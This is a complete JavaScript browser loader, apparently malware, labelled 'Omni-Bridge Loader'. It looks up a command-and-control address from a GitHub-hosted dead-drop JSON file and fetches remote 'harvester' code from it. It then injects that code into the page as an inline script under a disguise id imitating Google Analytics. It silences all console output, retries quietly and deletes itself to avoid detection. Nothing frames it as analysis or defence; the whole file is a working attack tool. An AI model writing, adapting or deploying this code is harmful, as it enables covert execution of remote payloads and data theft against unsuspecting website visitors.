/**
 * THE OMNI-BRIDGE LOADER v22.2 (GHOST INJECTION & URL-SANITY EDITION)
 * PURPOSE: Resilient C2 Discovery via Fetch-Injection & Defensive URL Parsing
 * ------------------------------------------------------------
 */

(async function() {
    "use strict";
    
    // THE GHOST OPERATOR LOGIC: Total silence in the console is mandatory.
    const log = (m) => {}; 
    const err = (m) => {};

    // THE DEAD-DROP REGISTRY: Using GitHub as a resilient, trusted dead-drop.
    const DEAD_DROP_JSON = 'https://arcanaumbra.github.io/result_predictor/tunnel.json';

    async function initializeRecon(retries = 25) {
        try {
            // 1. RESOLVE ACTIVE TUNNEL FROM DEAD-DROP
            // Cache-busting ensures we bypass GitHub's CDN to get the freshest tunnel info.
            const resolverUrl = `${DEAD_DROP_JSON}?nocache=${Date.now()}`;
            
            const response = await fetch(resolverUrl, { 
                method: 'GET',
                mode: 'cors',
                cache: 'no-store' 
            });
            
            if (!response.ok) {
                if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 10000);
                return;
            }

            const config = await response.json();
            
            // 2. DEFENSIVE URL DECODING & SANITIZATION
            /**
             * The 'Invalid URL' error often stems from malformed Base64 or missing protocols.
             * We decode, trim, and force the https protocol to satisfy the URL constructor.
             */
            let rawUrl = atob(config.u).trim();
            if (!rawUrl.startsWith('http')) {
                rawUrl = 'https://' + rawUrl;
            }

            let harvesterUrl;
            try {
                // Pre-validate the URL. If this fails, the error is caught and we retry.
                harvesterUrl = new URL(rawUrl).href;
            } catch (uErr) {
                if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 15000);
                return;
            }

            // 3. GHOST INJECTION (Bypasses Strict MIME Type Checking)
            /**
             * We fetch the harvester code as a raw string. This bypasses the browser's
             * security sentries that block scripts based on MIME types (text/html vs application/javascript).
             */
            const scriptResponse = await fetch(harvesterUrl, {
                method: 'GET',
                mode: 'cors',
                cache: 'no-cache'
            });

            if (!scriptResponse.ok) {
                // If 404/530, the tunnel is still propagating. Retry silently.
                if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 15000);
                return;
            }

            const scriptCode = await scriptResponse.text();

            // 4. THE MEMORY BRIDGE & SILENT EXECUTION
            /**
             * By injecting the 'window._C2_HUB' variable, we provide the harvester
             * with a bulletproof fallback for its origin detection, preventing
             * the 'Invalid URL' error when it tries to parse an empty script.src.
             */
            const script = document.createElement('script');
            script.textContent = `window._C2_HUB = "${harvesterUrl}";\n` + scriptCode;
            script.id = "ga-core-bridge";
            
            // Append to documentElement for maximum stealth.
            (document.documentElement || document.head).appendChild(script);
            
            // CLEANUP: The loader self-destructs to leave no trace in the DOM.
            if (document.currentScript) document.currentScript.remove();
            
        } catch (e) {
            // Total silent failure. The operation persists in the shadows.
            if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 20000);
        }
    }

    // IGNITION
    initializeRecon();

})();
